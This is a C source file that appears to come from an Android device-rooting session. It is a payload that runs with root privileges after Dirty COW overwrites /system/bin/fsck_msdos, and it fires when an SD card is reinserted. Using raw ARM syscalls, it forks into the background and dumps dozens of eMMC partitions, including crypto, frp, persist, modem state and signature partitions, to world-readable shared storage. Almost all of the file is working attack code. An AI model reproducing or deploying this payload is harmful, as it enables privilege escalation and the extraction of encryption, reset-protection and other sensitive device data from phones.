/* session61 extcsd_read.c  (v6: partition sweep)
 *
 * vold-domain root payload (Dirty COW -> /system/bin/fsck_msdos, triggered by
 * SD reinsert). Dumps a broad set of small eMMC partitions to
 * /storage/emulated/legacy/p_<name>.bin (<=2MB each) to look for the boot
 * chain / boot-partition decision (blog, rcause, bcota, sdi, boardid, ...).
 * Read-only against the eMMC.
 */

#define SYS_exit        1
#define SYS_read        3
#define SYS_write       4
#define SYS_open        5
#define SYS_close       6
#define SYS_umask       60
#define SYS_clone       120

#define O_RDONLY        0
#define O_WRONLY        1
#define O_CREAT         0x40
#define O_TRUNC         0x200
#define O_APPEND        0x400

static inline long sc6(long n, long a, long b, long c, long d, long e, long f)
{
    register long r0 asm("r0") = a;
    register long r1 asm("r1") = b;
    register long r2 asm("r2") = c;
    register long r3 asm("r3") = d;
    register long r4 asm("r4") = e;
    register long r5 asm("r5") = f;
    asm volatile("mov r7, %[n]\n\tsvc 0"
                 : "+r"(r0)
                 : [n] "r"(n), "r"(r1), "r"(r2), "r"(r3), "r"(r4), "r"(r5)
                 : "r7", "memory");
    return r0;
}
static void ex(long c) { sc6(SYS_exit, c, 0, 0, 0, 0, 0); for (;;) {} }

static long slen(const char *s) { long n = 0; while (s[n]) n++; return n; }
static void scpy(char *d, const char *s) { while (*s) *d++ = *s++; *d = 0; }
static void scat(char *d, const char *s) { while (*d) d++; scpy(d, s); }

static const char *OUTBASE = "/storage/emulated/legacy/";
static const char *BYNAME  = "/dev/block/platform/msm_sdcc.1/by-name/";
static char logpath[128];

static void lograw(const char *msg, long n)
{
    long f = sc6(SYS_open, (long)logpath, O_WRONLY | O_CREAT | O_APPEND, 0644, 0, 0, 0);
    if (f >= 0) { sc6(SYS_write, f, (long)msg, n, 0, 0, 0); sc6(SYS_close, f, 0, 0, 0, 0, 0); }
}
static void logmsg(const char *msg) { lograw(msg, slen(msg)); }
static void loghex8(const char *tag, unsigned long v)
{
    char b[80]; int i = 0, k;
    while (*tag) b[i++] = *tag++;
    b[i++] = '0'; b[i++] = 'x';
    for (k = 0; k < 8; k++) { int d = (v >> ((7 - k) * 4)) & 0xf; b[i++] = d < 10 ? '0' + d : 'a' + d - 10; }
    b[i++] = '\n'; b[i] = 0; logmsg(b);
}

static long dump(const char *name, long max)
{
    static char buf[65536];
    char src[160], dst[192];
    scpy(src, BYNAME); scat(src, name);
    long fd = sc6(SYS_open, (long)src, O_RDONLY, 0, 0, 0, 0);
    logmsg("  "); logmsg(name); loghex8("  open=", (unsigned long)fd);
    if (fd < 0) return fd;
    scpy(dst, OUTBASE); scat(dst, "p_"); scat(dst, name); scat(dst, ".bin");
    long of = sc6(SYS_open, (long)dst, O_WRONLY | O_CREAT | O_TRUNC, 0644, 0, 0, 0);
    if (of < 0) { loghex8("    dst fail ", (unsigned long)of); sc6(SYS_close, fd, 0, 0, 0, 0, 0); return of; }
    long total = 0, r;
    while (total < max) {
        long want = max - total; if (want > sizeof buf) want = sizeof buf;
        r = sc6(SYS_read, fd, (long)buf, want, 0, 0, 0);
        if (r <= 0) break;
        sc6(SYS_write, of, (long)buf, r, 0, 0, 0);
        total += r;
    }
    sc6(SYS_close, of, 0, 0, 0, 0, 0);
    sc6(SYS_close, fd, 0, 0, 0, 0, 0);
    loghex8("    dumped=", (unsigned long)total);
    return total;
}

void _start(void)
{
    static const char *names[] = {
        "blog", "rcause", "bcota", "oemspare", "spare", "oem", "pad",
        "fsg", "fsc", "nvuser", "perm", "ssd", "ares", "crypto",
        "ddr", "bkup_ddr", "sdi", "tz", "rpm",
        "boardid", "prdid", "boardidsig", "prdidsig", "bootsig", "recoverysig", "gsign",
        "calback_b", "calwork_b", "dmi_b", "mct_b", "nvram",
        "modemst1", "modemst2", "frp", "metadata", "persist",
        0
    };
    sc6(SYS_umask, 0, 0, 0, 0, 0, 0);
    scpy(logpath, OUTBASE); scat(logpath, "extcsd_j61.txt");

    long pid = sc6(SYS_clone, 17, 0, 0, 0, 0, 0);
    if (pid != 0) ex(0);

    logmsg("\nsession61 v6 partition sweep: start\n");
    for (int i = 0; names[i]; i++)
        dump(names[i], 2*1024*1024);
    logmsg("session61 v6: done\n");
    ex(0);
}
